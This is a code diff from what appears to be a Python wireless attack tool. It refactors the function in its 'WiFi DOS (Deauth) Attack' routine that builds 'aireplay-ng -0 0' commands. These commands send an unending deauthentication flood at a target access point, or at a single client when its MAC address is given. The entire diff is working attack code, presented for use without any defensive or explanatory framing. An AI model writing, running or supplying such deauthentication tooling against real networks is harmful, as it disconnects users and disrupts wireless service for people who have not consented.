@@ -57,7 +57,7 @@ def wifi_dos(device):
             ]
     if utils.yesNo("WiFi DOS (Deauth) Attack", target_descs, "Start WiFi DOS Attack?", False):        
         utils.header("WiFi DOS (Deauth) Attack", "WiFi DOS Attack Starting...")
-        process_command = deauth_wifi_command(target, device, target_host, target_host == "")
+        process_command = deauth_wifi_command(target, device, target_host)
         
         utils.header("Loading WiFi DOS attack...")
         enable = interface.enable_monitor(device, channel=target["channel"])
@@ -75,20 +75,11 @@ def wifi_dos(device):
         utils.header("WiFi DOS (Deauth) Attack", "WiFi DOS Attack Cancelled!")
 
 #Returns deauth WiFi command to be executed.
-def deauth_wifi_command(wifi:dict, device, host_macaddress:"", host_mode=False):
+def deauth_wifi_command(wifi:dict, device, host_macaddress:""):
     wifi_macaddress = wifi["bssid"]
     device_logicalname = interface.get_logicalname(device)
 
-    utils.header("Loading WiFi DOS attack...", ["Airmon-ng active!","Loading deauth attack..."])
-
-    command = "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname
-    loading_dos = "Loading WiFi DOS attack..."
-    host_err = ["Airmon-ng active!","Host Specific Mode Configuration Error"]
-    if host_mode and host_macaddress != "":
-        utils.header(loading_dos, host_err)
-        if utils.yesNo(loading_dos, host_err,"Do you want to continue in non-host specific mode?", True):
-            command = "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname
-        else:
-            return None
-
-    return command
+    if host_macaddress == "":
+        return "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname
+    else:
+        return "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname
